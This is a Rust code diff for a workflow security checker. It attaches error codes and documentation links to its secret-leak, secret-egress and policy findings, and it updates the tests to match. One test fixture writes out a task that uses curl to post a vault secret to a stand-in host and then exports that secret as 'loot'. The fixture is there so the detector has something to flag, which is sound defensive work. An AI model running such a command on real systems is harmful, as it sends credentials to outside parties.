@@ -28,8 +28,8 @@ use super::{CheckReport, FindingSeverity};
 #[non_exhaustive]
 pub struct UnifiedFinding {
     /// The class slug (`conformance` · `secret_leak` · `secret_egress` ·
-    /// `capability_escape` · `schema_type` · `gate` · `unknown_tool` ·
-    /// `unknown_arg` · `missing_arg` · `schema_lint`).
+    /// `capability_escape` · `policy` · `schema_type` · `gate` ·
+    /// `unknown_tool` · `unknown_arg` · `missing_arg` · `schema_lint`).
     pub kind: &'static str,
     /// The ladder section the human render files this under.
     pub gate: &'static str,
@@ -90,15 +90,23 @@ pub(super) fn collect(report: &CheckReport) -> Vec<UnifiedFinding> {
                 l.sink, l.task, l.trace, l.sink_id, l.secret
             ),
         );
+        // W4 (spec 10): the flow refusal carries its wire code — the
+        // message keeps the TaintTrace verbatim (it IS the witness).
+        f.code = Some("NIKA-SEC-006".to_owned());
+        f.docs_url = Some(format!("{}/NIKA-SEC-006", super::ERROR_DOCS_BASE));
         f.task = Some(l.task.clone());
         out.push(f);
     }
     for e in &report.secret_egresses {
-        out.push(UnifiedFinding::new(
+        let mut f = UnifiedFinding::new(
             "secret_egress",
             "SECRETS",
             format!("EGRESS via outputs.{} — {}", e.output, e.trace),
-        ));
+        );
+        // NIKA-SEC-007 — a tainted value reaches the workflow boundary.
+        f.code = Some("NIKA-SEC-007".to_owned());
+        f.docs_url = Some(format!("{}/NIKA-SEC-007", super::ERROR_DOCS_BASE));
+        out.push(f);
     }
     for c in &report.capability_escapes {
         let mut f = UnifiedFinding::new(
@@ -120,6 +128,14 @@ pub(super) fn collect(report: &CheckReport) -> Vec<UnifiedFinding> {
         f.code = Some(code.to_owned());
         f.docs_url = Some(format!("{}/{code}", super::ERROR_DOCS_BASE));
         f.task = Some(c.task.clone());
+        out.push(f);
+    }
+    for p in &report.policy_findings {
+        // spec 10 — the detail already names rule + task + witness.
+        let mut f = UnifiedFinding::new("policy", "POLICY", p.detail.clone());
+        f.code = Some("NIKA-POLICY-001".to_owned());
+        f.docs_url = Some(format!("{}/NIKA-POLICY-001", super::ERROR_DOCS_BASE));
+        f.task.clone_from(&p.task);
         out.push(f);
     }
     for s in &report.schema_findings {
@@ -286,9 +302,11 @@ mod tests {
         }
     }
 
-    /// The canonical-code law: conformance + escapes + tool-contract
-    /// classes carry a code AND its docs url; analysis-native classes
-    /// carry neither (a conjured code would 404).
+    /// The canonical-code law: conformance + escapes + secret-flow +
+    /// policy + tool-contract classes carry a code AND its docs url;
+    /// analysis-native classes carry neither (a conjured code would 404).
+    /// W4: the two flow refusals were report-only until the canon
+    /// registered NIKA-SEC-006/007 (spec 10 §secret flow refusals).
     #[test]
     fn codes_ride_only_where_canonical() {
         let r = report(
@@ -305,6 +323,49 @@ mod tests {
             Some("https://nika.sh/errors/NIKA-SEC-004")
         );
         assert_eq!(escape.task.as_deref(), Some("a"));
+
+        // secret_leak → NIKA-SEC-006 · secret_egress → NIKA-SEC-007 —
+        // the message keeps the taint trace verbatim (it IS the witness).
+        let r = report(
+            "nika: v1\nworkflow:\n  id: w\nsecrets:\n  k: { source: vault, key: x }\ntasks:\n  a:\n    exec: { command: [\"curl\", \"-d\", \"${{ secrets.k }}\", \"https://x.test\"] }\noutputs:\n  loot: ${{ secrets.k }}\n",
+        );
+        let leak = r
+            .findings
+            .iter()
+            .find(|f| f.kind == "secret_leak")
+            .expect("leak");
+        assert_eq!(leak.code.as_deref(), Some("NIKA-SEC-006"));
+        assert_eq!(
+            leak.docs_url.as_deref(),
+            Some("https://nika.sh/errors/NIKA-SEC-006")
+        );
+        assert!(
+            leak.message.contains("secrets.k"),
+            "the taint trace stays the witness: {}",
+            leak.message
+        );
+        let egress = r
+            .findings
+            .iter()
+            .find(|f| f.kind == "secret_egress")
+            .expect("egress");
+        assert_eq!(egress.code.as_deref(), Some("NIKA-SEC-007"));
+        assert_eq!(
+            egress.docs_url.as_deref(),
+            Some("https://nika.sh/errors/NIKA-SEC-007")
+        );
+
+        // policy → NIKA-POLICY-001 (spec 10).
+        let r = report(
+            "nika: v1\nworkflow:\n  id: w\npolicy:\n  limits: { max_tasks: 1 }\ntasks:\n  a:\n    infer: { prompt: \"x\" }\n  b:\n    infer: { prompt: \"y\" }\n",
+        );
+        let policy = r
+            .findings
+            .iter()
+            .find(|f| f.kind == "policy")
+            .expect("policy row");
+        assert_eq!(policy.code.as_deref(), Some("NIKA-POLICY-001"));
+        assert_eq!(policy.gate, "POLICY");
     }
 
     /// The wire shape: absent optionals are ABSENT (never null) — the
